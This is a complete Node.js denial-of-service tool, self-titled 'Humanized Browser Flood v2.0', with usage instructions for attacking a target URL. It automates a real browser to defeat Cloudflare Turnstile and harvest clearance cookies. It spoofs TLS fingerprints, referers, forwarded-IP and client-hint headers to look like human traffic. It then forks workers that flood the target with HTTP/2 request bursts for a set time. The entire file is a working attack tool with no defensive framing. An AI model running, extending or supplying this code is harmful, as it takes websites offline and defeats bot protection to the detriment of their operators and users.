const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const EventEmitter = require('events');
const os = require('os');
EventEmitter.defaultMaxListeners = 0;
const MAX_CONCURRENT_STREAMS_PER_WORKER = 150;
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "ecdsa_secp521r1_sha512",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
const secureOptionsList = [
    crypto.constants.SSL_OP_NO_RENEGOTIATION,
    crypto.constants.SSL_OP_NO_TICKET,
    crypto.constants.SSL_OP_NO_SSLv2,
    crypto.constants.SSL_OP_NO_SSLv3,
    crypto.constants.SSL_OP_NO_COMPRESSION,
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
    crypto.constants.SSL_OP_TLSEXT_PADDING,
    crypto.constants.SSL_OP_ALL
];
const ACCEPT_TYPES = {
    document: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
};
const REFERERS = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.youtube.com/',
    'https://www.instagram.com/',
    'https://www.linkedin.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    '',  // No referer
    'https://t.co/',
    'https://www.dstatbot.com',
    'https://www.reddit.com/'
];
function randomElement(list) {
    return list[Math.floor(Math.random() * list.length)];
}
function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomDelay(min, max) {
    return randomInt(min, max);
}
function getChromeVersion(userAgent) {
    const chromeVersionRegex = /Chrome\/([\d.]+)/;
    const match = userAgent.match(chromeVersionRegex);
    return match ? match[1] : "126.0.0.0";
}
function platformFromUA(userAgent) {
    if (/iPhone|iPad|iPod/.test(userAgent)) return { platform: 'iOS', mobile: '?1' };
    if (/Android/.test(userAgent)) return { platform: 'Android', mobile: '?1' };
    if (/Macintosh|Mac OS X/.test(userAgent)) return { platform: 'macOS', mobile: '?0' };
    if (/Linux/.test(userAgent)) return { platform: 'Linux', mobile: '?0' };
    return { platform: 'Windows', mobile: '?0' };
}
function hostOf(u) {
    try { return new URL(u).host; } catch (_) { return ''; }
}
function generateHeaders(parsed, userAgent, cookie, workerId, acceptLanguage) {
    const chromeVer = getChromeVersion(userAgent);
    const majorVer = chromeVer.split('.')[0];
    const { platform, mobile } = platformFromUA(userAgent);
    const headers = {
        ':method': 'GET',
        ':authority': parsed.host,
        ':scheme': 'https',
        ':path': (parsed.pathname || '/') + (parsed.search || ''),
        'user-agent': userAgent,
        'accept': ACCEPT_TYPES.document,
        'accept-language': acceptLanguage || 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'cache-control': 'max-age=0',
    };
    let referer = '';
    if (Math.random() > 0.7) {
        referer = randomElement(REFERERS) || parsed.href;
        headers['referer'] = referer;
    }
    if (cookie) headers['cookie'] = cookie;
    headers['upgrade-insecure-requests'] = '1';
    headers['sec-fetch-dest'] = 'document';
    headers['sec-fetch-mode'] = 'navigate';
    const refHost = referer ? hostOf(referer) : '';
    headers['sec-fetch-site'] = (!referer || refHost === parsed.host) ? 'same-origin' : 'cross-site';
    headers['sec-fetch-user'] = '?1';
    headers['sec-ch-ua'] = `"Chromium";v="${majorVer}", "Not)A;Brand";v="8", "Google Chrome";v="${majorVer}"`;
    headers['sec-ch-ua-mobile'] = mobile;
    headers['sec-ch-ua-platform'] = `"${platform}"`;
    if (Math.random() > 0.5) headers['dnt'] = '1';
    if (Math.random() > 0.8) headers['x-forwarded-for'] = `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(0,255)}`;

    return headers;
}
function parseArguments() {
    if (process.argv.includes('--help') || process.argv.includes('-h')) {
        showHelp();
        process.exit(0);
    }

    function showHelp() {
        console.clear();
        console.log("Coded by (Kaze) | Humanized Browser Flood v2.0");
        console.log("------------------------------------------------");
        console.log("Usage: node 1.js <target> <time> <rate> <threads> <cookieCount>");
        console.log("");
        console.log("Arguments:");
        console.log("  target       : Target URL (example: https://example.com)");
        console.log("  time         : Attack duration (seconds)");
        console.log("  rate         : Requests per second per thread");
        console.log("  threads      : Number of worker threads");
        console.log("  cookieCount  : Number of browser sessions to obtain");
        console.log("");
        console.log("Example: node 1.js https://example.com 60 10 4 5");
    }

    if (process.argv.length < 7) {
        showHelp();
        process.exit(1);
    }
    const target = process.argv[2];
    const time = parseInt(process.argv[3]);
    const rate = parseInt(process.argv[4]);
    const threads = parseInt(process.argv[5]);
    const cookieCount = parseInt(process.argv[6]);
    return { target, time, rate, threads, cookieCount };
}
const activeClients = new Set();
function trackClient(entry) {
    activeClients.add(entry);
}
function untrackClient(entry) {
    activeClients.delete(entry);
}
function shutdownAll() {
    for (const entry of activeClients) {
        try { if (entry.requestLoop) clearInterval(entry.requestLoop); } catch (_) {}
        try { if (entry.client && !entry.client.destroyed) entry.client.destroy(); } catch (_) {}
    }
    activeClients.clear();
}
process.once('SIGINT', () => {
    shutdownAll();
    process.exit(0);
});
process.once('SIGTERM', () => {
    shutdownAll();
    process.exit(0);
});
function flood(userAgent, cookie, workerId, acceptLanguage) {
    try {
        let parsed = url.parse(args.target);
        const baseInterval = randomDelay(300, 900); // 0.3s - 0.9s
        function createTLSSocket(parsed) {
            const tlsSocket = tls.connect({
                host: parsed.hostname,
                port: 443,
                servername: parsed.hostname,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2", "http/1.1"],
                ciphers: ciphers,
                sigalgs: sigalgs.join(':'),
                ecdhCurve: "X25519:P-256:P-384",
                secureOptions: randomElement(secureOptionsList),
                rejectUnauthorized: false
            });
            tlsSocket.on('error', () => {});
            return tlsSocket;
        }
        const tlsSocket = createTLSSocket(parsed);
        tlsSocket.on('error', () => { if(!tlsSocket.destroyed) tlsSocket.destroy(); });
        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxFrameSize: 16384,
                maxConcurrentStreams: 1000,
                maxHeaderListSize: 262144
            },
            peerMaxConcurrentStreams: 1000
        });
        const entry = { client, requestLoop: null, dead: false };
        trackClient(entry);
        function cleanup() {
            if (entry.dead) return;
            entry.dead = true;
            if (entry.requestLoop) {
                clearInterval(entry.requestLoop);
                entry.requestLoop = null;
            }
            untrackClient(entry);
            try { if (!client.destroyed) client.destroy(); } catch (_) {}
        }
        function scheduleReconnect() {
            cleanup();
            setTimeout(() => flood(userAgent, cookie, workerId, acceptLanguage), randomDelay(2000, 4000));
        }
        client.on("connect", () => {
            entry.requestLoop = setInterval(() => {
                if (entry.dead || client.destroyed || client.closed) {
                    if (entry.requestLoop) {
                        clearInterval(entry.requestLoop);
                        entry.requestLoop = null;
                    }
                    return;
                }
                const batchSize = randomInt(1, args.rate);
                for (let i = 0; i < batchSize; i++) {
                    if (entry.dead || client.destroyed || client.closed) break;
                    const headers = generateHeaders(parsed, userAgent, cookie, workerId, acceptLanguage);

                    let request;
                    try {
                        request = client.request(headers, {
                            weight: randomInt(1, 256),
                            exclusive: false,
                            parent: 0
                        });
                    } catch (_) {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                        break;
                    }

                    request.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        request.on('data', () => {});
                        request.on('end', () => {});
                    });

                    request.on("error", () => {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                    });

                    try { request.end(); } catch (_) {}
                }
            }, baseInterval);
        });

        client.on("close", () => {
            scheduleReconnect();
        });

        client.on("error", () => {
            scheduleReconnect();
        });
        
    } catch (err) {
        global.failedRequests = (global.failedRequests || 0) + 1;
    }
}
async function bypassCloudflareOnce(attemptNum = 1) {
    let response = null;
    let browser = null;
    let page = null;
    try {
        console.log(`\x1b[33mStarting bypass attempt ${attemptNum}...\x1b[0m`);
        
        response = await connect({
            headless: false,
            turnstile: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--window-size=1920,1080',
                '--disable-blink-features=AutomationControlled',
                '--disable-infobars',
                '--start-maximized',
                '--disable-extensions',
                '--lang=en-US,en;q=0.9',
                '--disable-background-networking',
                '--disable-default-apps',
                '--disable-sync',
                '--metrics-recording-only',
                '--mute-audio',
                '--no-default-browser-check',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-renderer-backgrounding'
            ],
            customConfig: {},
            connectOption: {
                defaultViewport: null
            },
            disableXvfb: false
        });
        browser = response.browser;
        page = response.page;
        console.log(`\x1b[33mAccessing ${args.target}...\x1b[0m`);
        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 60000 });
        let challengeCompleted = false;
        let checkCount = 0;
        
        while (!challengeCompleted && checkCount < 60) {
            await new Promise(r => setTimeout(r, 500));
            const cookies = await page.cookies();
            const cfClearance = cookies.find(c => c.name === "cf_clearance");
            
            if (cfClearance) {
                challengeCompleted = true;
                break;
            }
            checkCount++;
        }
        const cookies = await page.cookies();
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        const userAgent = await page.evaluate(() => navigator.userAgent);
        let acceptLanguage = 'en-US,en;q=0.9';
        try {
            acceptLanguage = await page.evaluate(() => navigator.language || navigator.languages.join(','));
        } catch (_) {}
        if (browser) await browser.close();
        if (cfClearance) {
             console.log(`\x1b[32mSuccess! cf_clearance obtained.\x1b[0m`);
             return { cookies, userAgent, acceptLanguage, success: true };
        } else {
             return { cookies: [], userAgent, acceptLanguage, success: false };
        }
        
    } catch (error) {
        console.log(`\x1b[31mBypass failed: ${error.message}\x1b[0m`);
        if (browser) await browser.close();
        return { success: false };
    }
}
async function bypassCloudflareParallel(totalCount, concurrency = 3) {
    console.log("\x1b[35mCLOUDFLARE BYPASS\x1b[0m");
    const workers = Math.max(1, Math.min(concurrency, totalCount));
    const results = [];
    let next = 0;

    async function poolWorker() {
        while (true) {
            const i = next++;
            if (i >= totalCount) break;
            const res = await bypassCloudflareOnce(i + 1);
            if (res.success) results.push(res);
        }
    }

    await Promise.all(Array.from({ length: workers }, () => poolWorker()));

    if (results.length === 0) {
        console.log("\x1b[31mFailed to get CF cookies. Using fallback.\x1b[0m");
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0",
            acceptLanguage: "en-US,en;q=0.9",
            success: true
        });
    }
    return results.slice(0, totalCount);
}
function runFlooder(workerId) {
    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies ? bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ") : "";
    const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    const acceptLanguage = bypassInfo.acceptLanguage || "en-US,en;q=0.9";

    flood(userAgent, cookieString, workerId, acceptLanguage);
}
function createProgressBar(percent, width = 30) {
    const filled = Math.floor((width * percent) / 100);
    const empty = width - filled;
    return '[' + 'I'.repeat(filled) + 'i'.repeat(empty) + ']';
}
function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    const rps = elapsed > 0 ? Math.floor((global.totalRequests || 0)/elapsed) : 0;
    const percent = Math.min(100, Math.floor((elapsed / args.time) * 100));
    const progressBar = createProgressBar(percent, 30);
    
    console.clear();
    console.log(`[ HUMANIZED BROWSER FLOOD - v2.0 ]`);
    console.log(`------------------------------------------------`);
    console.log(`» Target      : ${args.target}`);
    console.log(`» Status      : ACTIVE FLOODING (Humanized Mode) ?`);
    console.log(`» Threads     : ${args.threads} @ ${args.rate} r/s/thread`);
    console.log(`» Progress    : ${progressBar} ${percent}%`);
    console.log(`------------------------------------------------`);
    console.log(`» Total Req   : ${(global.totalRequests || 0).toLocaleString()}`);
    console.log(`» Success     : ${(global.successRequests || 0).toLocaleString()}`);
    console.log(`» Failed      : ${(global.failedRequests || 0).toLocaleString()}`);
    console.log(`» RPS         : ${rps}`);
    console.log(`------------------------------------------------`);
    console.log(`[ ${elapsed}s / ${args.time}s ]`);
}
global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

const args = parseArguments();

if (cluster.isMaster) {
    console.clear();
    console.log(`[ HUMANIZED BROWSER FLOOD - v2.0 ]`);
    console.log(`------------------------------------------------`);
    console.log(`\x1b[32m[?] Launching bypass...\x1b[0m\n`);
    
    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount, 3);
        global.bypassData = bypassResults;
        
        console.log(`\n\x1b[32m[?] Got ${bypassResults.length} browser sessions. Forking ${args.threads} workers...\x1b[0m`);
        
        global.startTime = Date.now();
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ 
                type: 'bypassData', 
                data: bypassResults,
                workerId: i
            });
        }
        
        const statsInterval = setInterval(displayStats, 1000);
        
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });
        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("\n\x1b[32mAttack completed.\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
    })();
    
} else {
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;
            const workerId = msg.workerId || 0;
            for (let i = 0; i < MAX_CONCURRENT_STREAMS_PER_WORKER; i++) {
                setTimeout(() => runFlooder(workerId), randomDelay(0, 5000));
            }
            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });
}
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
module.exports = { parseArguments };